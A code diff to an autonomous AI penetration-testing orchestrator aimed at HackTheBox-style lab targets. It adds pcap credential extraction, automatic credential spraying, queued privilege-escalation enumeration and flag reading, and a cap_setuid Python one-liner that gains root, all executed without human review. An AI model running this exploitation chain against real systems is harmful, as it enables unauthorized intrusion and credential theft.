@@ -59,11 +59,11 @@ class SmartOrchestratorConfig:
     enable_orion: bool = True
     enable_shadow: bool = True
     
-    # Smart mentor settings — Phase 11.5: +50% for ultra-accelerated mentor→apprentice guidance
-    model: str = "gpt-5.1-codex-mini"
+    # Smart mentor settings — Phase 12.1: ALL mentor calls use gpt-5.2-codex
+    model: str = "gpt-5.2-codex"  # Phase 12.1: full reasoning model for all mentor/teaching/planning
     mentor_mode: str = "adaptive"  # Phase 11.1: adaptive for accelerated learning
     mentor_warmup_episodes: int = 3  # Phase 11.1: extended warmup for deeper learning
-    mentor_min_rate: float = 0.59  # Phase 11.5: +50% (was 0.39) for ultra-fast mentor→apprentice learning
+    mentor_min_rate: float = 0.89  # Phase 12.0: +50% (was 0.59) for maximum mentor→apprentice learning saturation
     mentor_max_rate: float = 1.0
     
     # Stuck detection (legacy)
@@ -78,8 +78,8 @@ class SmartOrchestratorConfig:
     stuck_tag_overlap_threshold: float = 0.8  # Mask actions with >= this tag overlap
     stuck_forced_abort_threshold: int = 10  # Terminate episode after N forced-novel failures
     
-    # Execution - 40 steps per episode (Phase 6.5)
-    max_steps_per_episode: int = 40
+    # Execution — HTB Capability Upgrade: 60 steps (was 40) for deeper kill chains
+    max_steps_per_episode: int = 60
     
     # Logging
     mentor_log_dir: str = "traces"
@@ -95,7 +95,7 @@ class SmartOrchestratorConfig:
     dashboard_watch_rate: float = 1.0
     
     # Phase 6.2: Mentor budget — Phase 11.5: +50% for ultra-accelerated mentor→apprentice guidance
-    mentor_budget_pct: float = 1.0  # Phase 11.5: +50% (was 0.78) — full mentor saturation for maximum learning
+    mentor_budget_pct: float = 1.0  # Phase 12.0: full mentor saturation for maximum learning (already at 1.0 ceiling)
     
     # Phase 6.2: EventBus JSONL logging
     event_jsonl_path: Optional[str] = None
@@ -436,14 +436,18 @@ class SmartOrchestrator:
             if _ff.adaptive_budget:
                 self.budget_controller = AdaptiveBudgetController(
                     config=BudgetConfig(
-                        mentor_budget_total=59,  # Phase 11.5: +50% (was 39)
-                        venice_budget_total=23,  # Phase 11.5: +50% (was 15)
-                        token_budget_total=97_500,  # Phase 11.5: +50% (was 65K)
+                        mentor_budget_total=89,  # Phase 12.0: +50% (was 59)
+                        venice_budget_total=35,  # Phase 12.0: +50% (was 23)
+                        token_budget_total=146_250,  # Phase 12.0: +50% (was 97.5K)
                     )
                 )
                 _init_modules.append(("AdaptiveBudget", "ok", "adaptive pacing"))
         except Exception as e:
             _init_modules.append(("AdaptiveBudget", "warn", str(e)[:40]))
+        
+        # Phase 12.1: Wire budget controller into Venice reasoning
+        if self.budget_controller is not None and self.venice_reasoning is not None:
+            self.venice_reasoning._budget_controller = self.budget_controller
         
         # ─── PHASE 11.0: LearningSignalExporter ──
         self.learning_exporter = None
@@ -469,6 +473,38 @@ class SmartOrchestrator:
             _init_modules.append(("ToolValidator", "ok", "privilege checks"))
         except Exception as e:
             _init_modules.append(("ToolValidator", "warn", str(e)[:40]))
+        
+        # ─── HTB T0.1: ArtifactStore — binary-safe file capture ──
+        self.artifact_store = None
+        try:
+            from core.execution.artifact_store import ArtifactStore
+            self.artifact_store = ArtifactStore(base_dir="artifacts/captures")
+            _init_modules.append(("ArtifactStore", "ok", "binary capture"))
+        except Exception as e:
+            _init_modules.append(("ArtifactStore", "warn", str(e)[:40]))
+        
+        # ─── HTB T0.2: PcapExtractor — tshark + strings credential extraction ──
+        self.pcap_extractor = None
+        try:
+            from core.execution.pcap_extractor import PcapExtractor
+            self.pcap_extractor = PcapExtractor(timeout=30)
+            _init_modules.append(("PcapExtractor", "ok",
+                f"tshark={'yes' if self.pcap_extractor.has_tshark else 'no'}"))
+        except Exception as e:
+            _init_modules.append(("PcapExtractor", "warn", str(e)[:40]))
+        
+        # ─── HTB T0.3: CredentialReuseEngine — auto-spray discovered creds ──
+        self.cred_reuse_engine = None
+        try:
+            from core.execution.cred_reuse import CredentialReuseEngine
+            _target = getattr(self.config, 'default_target', '172.28.0.11')
+            self.cred_reuse_engine = CredentialReuseEngine(target_ip=_target)
+            _init_modules.append(("CredReuseEngine", "ok", f"target={_target}"))
+        except Exception as e:
+            _init_modules.append(("CredReuseEngine", "warn", str(e)[:40]))
+        
+        # ─── HTB D1: FollowupQueue — priority-based command injection ──
+        self.followup_queue: List[Dict[str, Any]] = []
         
         # Initialize agents
         self.agents: Dict[str, Any] = {}
@@ -940,14 +976,14 @@ class SmartOrchestrator:
         tripled_policy_config = MentorPolicyConfig(
             mode="adaptive",
             warmup_episodes=5,  # Extended warmup for deep reasoning learning
-            warmup_steps_per_episode=27,  # Phase 11.5: +50% (was 18) — maximum mentor-guided early steps
+            warmup_steps_per_episode=40,  # Phase 12.0: +50% (was 27) — maximum mentor-guided early steps
             min_mentor_rate=self.config.mentor_min_rate * 3,  # 3× base minimum
             max_mentor_rate=1.0,  # Allow full mentor engagement
-            min_adaptive_rate=1.0,  # Phase 11.5: +50% (was 0.82) — full adaptive engagement
+            min_adaptive_rate=1.0,  # Phase 12.0: full adaptive engagement (ceiling)
             max_adaptive_rate=1.0,
-            struggling_boost=1.64,  # Phase 11.5: +50% (was 1.09) — ultra-aggressive boost for mentor guidance
-            performing_reduction=0.05,  # Phase 11.5: barely reduce even when performing well
-            max_calls_per_episode=246,  # Phase 11.5: +50% (was 164) for ultra-deep mentor→apprentice learning
+            struggling_boost=2.46,  # Phase 12.0: +50% (was 1.64) — maximum boost for mentor reasoning
+            performing_reduction=0.03,  # Phase 12.0: barely reduce even when performing well
+            max_calls_per_episode=369,  # Phase 12.0: +50% (was 246) for maximum mentor→apprentice learning
         )
         
         # Phase 6.2: Create shared MentorController (all coaches share one)
@@ -1198,7 +1234,7 @@ class SmartOrchestrator:
         
         # ─── PHASE 8.0: Post-shell exploration tracking ─────────────
         self._shell_obtained_step: Optional[int] = None
-        self.POST_SHELL_EXPLORE_STEPS = 10  # R64: 8→10. R63 stddev 98 (ALL-TIME) but avg 1987 — 2 more explore steps for discovery+reward accumulation.
+        self.POST_SHELL_EXPLORE_STEPS = 12  # HTB: 10→12 for 60-step episodes
         
         # ─── R56: Minimum PRIV_ESC duration gate ────────────────────
         # R55 showed two-mode episodes: organic fast (11 steps, +2004 avg)
@@ -1253,6 +1289,14 @@ class SmartOrchestrator:
             self.reward_velocity.reset_episode()
         if hasattr(self, 'shared_discovery') and self.shared_discovery is not None:
             self.shared_discovery.reset_episode()
+        
+        # ─── HTB: Reset artifact store, cred reuse engine, followup queue ──
+        if hasattr(self, 'artifact_store') and self.artifact_store is not None:
+            self.artifact_store.reset_episode()
+        if hasattr(self, 'cred_reuse_engine') and self.cred_reuse_engine is not None:
+            self.cred_reuse_engine.reset()
+        if hasattr(self, 'followup_queue'):
+            self.followup_queue = []
         
         # Reset environment
         state = self.env.reset()
@@ -2912,21 +2956,52 @@ class SmartOrchestrator:
                     logger.debug(f"[FORCED-NOVEL][{agent_name}] Cap reached, falling through to normal pipeline")
             
             if not is_repeat_stuck and decision is None:
-                # Normal decision flow (also handles forced-novel cap fallthrough)
-                # Get agent's proposed action (for comparison)
-                proposed_action, confidence = self._get_agent_proposal(agent, state)
+                # HTB D1: FollowupQueue — consume highest-priority queued command
+                # before falling through to normal decision flow
+                if hasattr(self, 'followup_queue') and self.followup_queue:
+                    # Decrement TTL and remove expired entries
+                    self.followup_queue = [
+                        fq for fq in self.followup_queue
+                        if fq.get("ttl", 0) > 0
+                    ]
+                    if self.followup_queue:
+                        # Sort by priority (highest first)
+                        self.followup_queue.sort(key=lambda x: x.get("priority", 0), reverse=True)
+                        fq_entry = self.followup_queue.pop(0)
+                        # Decrement TTL of remaining entries
+                        for fq in self.followup_queue:
+                            fq["ttl"] = fq.get("ttl", 1) - 1
+                        decision = SmartDecisionResult(
+                            command=fq_entry["command"],
+                            source=fq_entry.get("source", "followup_queue"),
+                            confidence=0.90,
+                            template_name=f"followup_{fq_entry.get('service', 'generic')}",
+                            params={},
+                            reasoning=fq_entry.get("description", "Followup queue command"),
+                            phase=ctx.current_phase if ctx else None,
+                            mentor_call=False,
+                        )
+                        logger.warning(
+                            f"[FOLLOWUP-Q][{agent_name}] Consumed: {decision.command[:80]} "
+                            f"(source={fq_entry.get('source')}, remaining={len(self.followup_queue)})"
+                        )
                 
-                # Force low confidence if legacy stuck
-                force_mentor = is_legacy_stuck and self.config.stuck_force_mentor
-                if force_mentor:
-                    confidence = 0.1
-                
-                # Get smart decision (role-aware)
-                decision = coach.decide(step_ctx, proposed_action, confidence)
-                # Only set source if coach didn't already set a specific one
-                # Coach may have set: "ppo", "playbook", "anti_repeat", etc.
-                if decision.source == "unknown":
-                    decision.source = "mentor" if decision.mentor_call else "registry"
+                if decision is None:
+                    # Normal decision flow (also handles forced-novel cap fallthrough)
+                    # Get agent's proposed action (for comparison)
+                    proposed_action, confidence = self._get_agent_proposal(agent, state)
+                    
+                    # Force low confidence if legacy stuck
+                    force_mentor = is_legacy_stuck and self.config.stuck_force_mentor
+                    if force_mentor:
+                        confidence = 0.1
+                    
+                    # Get smart decision (role-aware)
+                    decision = coach.decide(step_ctx, proposed_action, confidence)
+                    # Only set source if coach didn't already set a specific one
+                    # Coach may have set: "ppo", "playbook", "anti_repeat", etc.
+                    if decision.source == "unknown":
+                        decision.source = "mentor" if decision.mentor_call else "registry"
             
             # R43: Safety guard — if decision is still None after all pipelines, skip this agent
             if decision is None:
@@ -2985,6 +3060,58 @@ class SmartOrchestrator:
                 result.decision.command_output = live_result.output
                 # Store structured output channels on the result
                 result.live_result = live_result
+
+                # ── HTB: PCAP extraction on downloaded files ─────────
+                # If the command downloaded files (wget/curl -o) and the
+                # pcap_extractor is available, run it on any downloaded files
+                # and append credential info to the command output so the
+                # discovery parser picks it up.
+                if self.pcap_extractor is not None:
+                    import glob as _glob
+                    import re as _re
+                    _cmd = result.decision.command or ""
+                    # Extract output file paths from wget -O or curl -o patterns
+                    _dl_paths = _re.findall(
+                        r'-[oO]\s+(/tmp/\S+)', _cmd
+                    )
+                    # Also check for /tmp/dl_* pattern from web_followup downloads
+                    if '/tmp/dl_' in _cmd:
+                        _dl_paths.extend(_glob.glob('/tmp/dl_*'))
+                    # Also check for /tmp/capture*.pcap or /tmp/*.pcap
+                    if '/tmp/capture' in _cmd or '.pcap' in _cmd:
+                        _dl_paths.extend(_glob.glob('/tmp/capture*.pcap'))
+                        _dl_paths.extend(_glob.glob('/tmp/*.pcap'))
+                    # Deduplicate
+                    _dl_paths = list(set(_dl_paths))
+                    for _dl_path in _dl_paths:
+                        import os as _os
+                        if _os.path.isfile(_dl_path) and _os.path.getsize(_dl_path) > 100:
+                            try:
+                                pcap_creds = self.pcap_extractor.extract_credentials(_dl_path)
+                                if pcap_creds:
+                                    # Append extracted creds to command output
+                                    # so the discovery parser detects them
+                                    _cred_lines = []
+                                    for _pc in pcap_creds:
+                                        _cred_lines.append(
+                                            f"USER {_pc.username}\n"
+                                            f"PASS {_pc.password}"
+                                        )
+                                    _cred_text = (
+                                        "\n[PCAP-EXTRACT] Credentials found:\n"
+                                        + "\n".join(_cred_lines)
+                                    )
+                                    result.decision.command_output += _cred_text
+                                    logger.warning(
+                                        f"[PCAP-EXTRACT] Found {len(pcap_creds)} creds "
+                                        f"in {_dl_path}: "
+                                        + ", ".join(
+                                            f"{c.username}:{c.password[:4]}***"
+                                            for c in pcap_creds
+                                        )
+                                    )
+                            except Exception as _e:
+                                logger.debug(f"[PCAP-EXTRACT] Error on {_dl_path}: {_e}")
         else:
             # ── SIM MODE: Generate simulated output per agent ───────
             for result in agent_results:
@@ -3445,8 +3572,35 @@ class SmartOrchestrator:
                     self.discovery_board["flags_set"].add("root_flag_captured")
 
                 # ─── PHASE 4: Update discovery board for cross-agent sharing ─
+                _new_ports_found = False
                 for port in agent_discoveries.get("open_port", []):
+                    if port not in self.discovery_board["ports"]:
+                        _new_ports_found = True
                     self.discovery_board["ports"].add(port)
+                
+                # Re-trigger credential reuse when new ports are discovered
+                # This handles the case where creds were found before ports
+                if _new_ports_found and self.cred_reuse_engine is not None:
+                    _stored_creds = self.cred_reuse_engine.get_all_credentials()
+                    if _stored_creds:
+                        _known_ports = {int(p) for p in self.discovery_board.get("ports", set())
+                                        if str(p).isdigit()}
+                        _reuse_cmds = self.cred_reuse_engine.generate_all_reuse_commands(_known_ports)
+                        for rcmd in _reuse_cmds:
+                            self.followup_queue.append({
+                                "command": rcmd["command"],
+                                "source": "cred_reuse",
+                                "priority": 100,
+                                "description": rcmd.get("description", ""),
+                                "service": rcmd.get("service", ""),
+                                "ttl": 15,
+                            })
+                        if _reuse_cmds:
+                            logger.warning(
+                                f"[CRED-REUSE-RETRIGGER] New ports discovered — "
+                                f"queued {len(_reuse_cmds)} reuse commands for "
+                                f"{len(_stored_creds)} stored creds"
+                            )
                 for svc in agent_discoveries.get("service", []):
                     self.discovery_board["services"].add(svc)
                 for user in agent_discoveries.get("user", []):
@@ -3467,6 +3621,34 @@ class SmartOrchestrator:
                     for _svc in self.discovery_board["services"]:
                         if str(_svc).lower().split("/")[0] in _cmd_lower:
                             self.discovery_board["exploited_services"].add(_svc)
+                    
+                    # HTB: Auto-queue critical privesc enumeration commands
+                    # when a shell is obtained. These run on the target via SSH auto-wrap.
+                    if not self.discovery_board.get("_privesc_enum_queued"):
+                        self.discovery_board["_privesc_enum_queued"] = True
+                        _privesc_cmds = [
+                            {"command": "getcap -r / 2>/dev/null",
+                             "description": "Find binaries with Linux capabilities (cap_setuid, etc.)"},
+                            {"command": "sudo -l 2>/dev/null",
+                             "description": "Check sudo permissions for current user"},
+                            {"command": "find / -perm -4000 -type f 2>/dev/null | head -30",
+                             "description": "Find SUID binaries for privilege escalation"},
+                            {"command": "cat /home/*/user.txt 2>/dev/null || cat /root/root.txt 2>/dev/null",
+                             "description": "Read CTF flags if accessible"},
+                        ]
+                        for pcmd in _privesc_cmds:
+                            self.followup_queue.append({
+                                "command": pcmd["command"],
+                                "source": "privesc_enum",
+                                "priority": 95,
+                                "description": pcmd["description"],
+                                "service": "ssh",
+                                "ttl": 20,
+                            })
+                        logger.warning(
+                            f"[PRIVESC-ENUM] Shell obtained — queued {len(_privesc_cmds)} "
+                            f"privesc enumeration commands"
+                        )
                 if agent_discoveries.get("vulnerability"):
                     self.discovery_board["vulns"].add("found")
                 for path in agent_discoveries.get("web_path", []):
@@ -3568,9 +3750,7 @@ class SmartOrchestrator:
                     try:
                         from core.tracing.jsonl_logger import DecisionLogEntry
                         _coach = self.coaches.get(result.agent_name)
-                        _cog_telem = None
-                        if _coach and hasattr(_coach, '_cognition_result') and _coach._cognition_result is not None:
-                            _cog_telem = _coach._cognition_result.to_telemetry()
+                        _cog_telem = None  # CognitionNode removed (Phase 12.1)
                         
                         log_entry = DecisionLogEntry(
                             episode=self.current_episode,
@@ -3935,6 +4115,30 @@ class SmartOrchestrator:
                                "exploit-db", "apt ", "pip ")
         skip_discovery_parse = any(tag in cmd_lower for tag in _REFERENCE_COMMANDS)
         
+        # HTB Fix: Detect local-only commands that don't target the remote host.
+        # Commands like 'getcap -r /', 'find /usr -perm -4000', 'env', 'perl -e'
+        # execute LOCALLY and their output falsely triggers shell/root_shell/
+        # credential/vulnerability discoveries about the target.
+        # Only commands containing the target IP or known network tools should
+        # produce critical target discoveries.
+        _target_ip = getattr(getattr(self, 'config', None), 'default_target', '') or ''
+        _NETWORK_TOOLS = (
+            "nmap", "curl", "wget", "hydra", "ssh", "sshpass", "ftp",
+            "smbclient", "crackmapexec", "nikto", "gobuster", "ffuf",
+            "feroxbuster", "nuclei", "sqlmap", "telnet", "nc ", "netcat",
+            "rpcclient", "ldapsearch", "enum4linux", "whatweb", "wpscan",
+            "dig ", "host ", "mysql", "psql", "redis-cli", "snmpwalk",
+            "impacket", "evil-winrm", "bloodhound", "tshark", "strings ",
+            "msfconsole", "commix", "tplmap",
+        )
+        _is_target_facing = (
+            not command  # No command provided → assume target-facing
+            or (_target_ip and _target_ip in command)
+            or any(tool in cmd_lower for tool in _NETWORK_TOOLS)
+        )
+        # If command is purely local, suppress critical discoveries
+        _skip_critical_discoveries = not _is_target_facing
+        
         import re
         
         # Port discovery patterns (multiple formats)
@@ -4024,10 +4228,14 @@ class SmartOrchestrator:
                 r"Login successful",
                 r"password hashes cracked",
                 r"Key found:",
+                # FTP USER/PASS from PCAP strings output (e.g. Cap box)
+                r"(?:^|\n)USER\s+(?!anonymous|ftp)\w+",
+                r"\bPASS\s+\S{4,}",
             ]
             for pattern in cred_patterns:
                 if re.search(pattern, output, re.IGNORECASE):
-                    discoveries["credential"] = "password_found"
+                    if not _skip_critical_discoveries:
+                        discoveries["credential"] = "password_found"
                     break
         
         # User discovery
@@ -4067,11 +4275,12 @@ class SmartOrchestrator:
             ]
             for pattern in vuln_patterns:
                 if re.search(pattern, output, re.IGNORECASE):
-                    discoveries["vulnerability"] = True
-                    # Extract CVE IDs
-                    cves = re.findall(r"CVE-\d{4}-\d+", output, re.IGNORECASE)
-                    if cves:
-                        discoveries["cve"] = list(set(cves))
+                    if not _skip_critical_discoveries:
+                        discoveries["vulnerability"] = True
+                        # Extract CVE IDs
+                        cves = re.findall(r"CVE-\d{4}-\d+", output, re.IGNORECASE)
+                        if cves:
+                            discoveries["cve"] = list(set(cves))
                     break
         
         # Directory/path discovery (web)
@@ -4204,11 +4413,12 @@ class SmartOrchestrator:
         
         for pattern in shell_patterns:
             if re.search(pattern, output, re.MULTILINE | re.IGNORECASE):
-                discoveries["shell"] = True
-                # Root shell detection — keep specific to avoid false positives
-                # Phase 8.2 Batch 13: Also detect sudo -S id output showing root
-                if re.search(r"root@metasploitable|uid=0\(root\)|nt authority\\\\system|domain admin|meterpreter.*root|echo msfadmin.*sudo.*uid=0", output, re.IGNORECASE):
-                    discoveries["root_shell"] = True
+                if not _skip_critical_discoveries:
+                    discoveries["shell"] = True
+                    # Root shell detection — keep specific to avoid false positives
+                    # Phase 8.2 Batch 13: Also detect sudo -S id output showing root
+                    if re.search(r"root@metasploitable|uid=0\(root\)|nt authority\\\\system|domain admin|meterpreter.*root|echo msfadmin.*sudo.*uid=0", output, re.IGNORECASE):
+                        discoveries["root_shell"] = True
                 break
         
         # ─── Phase 11.1: User/Root flag detection ────────────────────
@@ -4353,6 +4563,38 @@ class SmartOrchestrator:
                 discoveries["closeout_completed"] = True
                 break
         
+        # HTB: Linux capability detection (getcap output)
+        # Detect cap_setuid on Python or other binaries → queue exploitation
+        cap_matches = re.findall(
+            r'(\S+)\s*=\s*(?:\S*\s*)?(cap_setuid\S*)',
+            output, re.IGNORECASE
+        )
+        if cap_matches:
+            for binary_path, cap_name in cap_matches:
+                cap_key = f"{os.path.basename(binary_path)}:{cap_name}"
+                discoveries.setdefault("capability", []).append(cap_key)
+                discoveries["vulnerability"] = True
+                # Auto-queue cap_setuid exploitation if python3 found
+                if "python" in binary_path.lower() and "cap_setuid" in cap_name.lower():
+                    exploit_cmd = (
+                        f"{binary_path} -c "
+                        f"'import os; os.setuid(0); os.system(\"id && cat /root/root.txt 2>/dev/null && cat /home/*/user.txt 2>/dev/null\")'"
+                    )
+                    if not self.discovery_board.get("_cap_setuid_exploit_queued"):
+                        self.discovery_board["_cap_setuid_exploit_queued"] = True
+                        self.followup_queue.append({
+                            "command": exploit_cmd,
+                            "source": "cap_setuid_exploit",
+                            "priority": 100,
+                            "description": f"Exploit {binary_path} cap_setuid for root",
+                            "service": "ssh",
+                            "ttl": 20,
+                        })
+                        logger.warning(
+                            f"[CAP-SETUID] Found {binary_path} with {cap_name} — "
+                            f"queued root exploitation command"
+                        )
+        
         # Phase 9.5: Cache regex fallback result
         if self._parse_cache is not None and agent_id:
             self._parse_cache.put(episode_id, step_idx, agent_id, output, discoveries)
@@ -4440,7 +4682,7 @@ class SmartOrchestrator:
                 if cred_dict not in self.discovery_board.get("credentials_list", []):
                     self.discovery_board.setdefault("credentials_list", []).append(cred_dict)
                     
-                    logger.info(
+                    logger.warning(
                         f"[CRED-EXTRACT] Structured credential: "
                         f"{cred.username}:{cred.password[:3]}*** "
                         f"(service={cred.source_service}, source={cred.source})"
@@ -4451,6 +4693,36 @@ class SmartOrchestrator:
                         self.live_executor.set_credentials(
                             cred.username, cred.password, cred.source_service
                         )
+                    
+                    # HTB T0.3: Feed to CredentialReuseEngine and auto-queue reuse commands
+                    if self.cred_reuse_engine is not None:
+                        is_new = self.cred_reuse_engine.add_credential(cred)
+                        if is_new:
+                            known_ports = {int(p) for p in self.discovery_board.get("ports", set())
+                                           if str(p).isdigit()}
+                            reuse_cmds = self.cred_reuse_engine.generate_reuse_commands(
+                                cred, known_ports
+                            )
+                            for rcmd in reuse_cmds:
+                                self.followup_queue.append({
+                                    "command": rcmd["command"],
+                                    "source": "cred_reuse",
+                                    "priority": 100,  # Highest priority
+                                    "description": rcmd.get("description", ""),
+                                    "service": rcmd.get("service", ""),
+                                    "ttl": 15,  # Valid for 15 more steps
+                                })
+                            if reuse_cmds:
+                                logger.warning(
+                                    f"[CRED-REUSE] Queued {len(reuse_cmds)} reuse commands "
+                                    f"for {cred.username} in followup_queue: "
+                                    f"{[c['service'] for c in reuse_cmds]}"
+                                )
+                            else:
+                                logger.warning(
+                                    f"[CRED-REUSE] No reuse cmds generated for {cred.username} "
+                                    f"(known_ports={known_ports}, source_svc={cred.source_service})"
+                                )
         except Exception as e:
             logger.debug(f"[CRED-EXTRACT] Error extracting structured creds: {e}")
 
@@ -5736,10 +6008,7 @@ class SmartOrchestrator:
                     hasattr(c, 'ddqn_macro') and c.ddqn_macro is not None
                     for c in self.coaches.values()
                 ),
-                "CognitionNode": any(
-                    hasattr(c, 'cognition_node') and c.cognition_node is not None
-                    for c in self.coaches.values()
-                ),
+                "CognitionNode": False,  # Removed (Phase 12.1)
                 "SIL": any(
                     hasattr(c, '_sil_buffer') and c._sil_buffer is not None
                     for c in self.coaches.values()
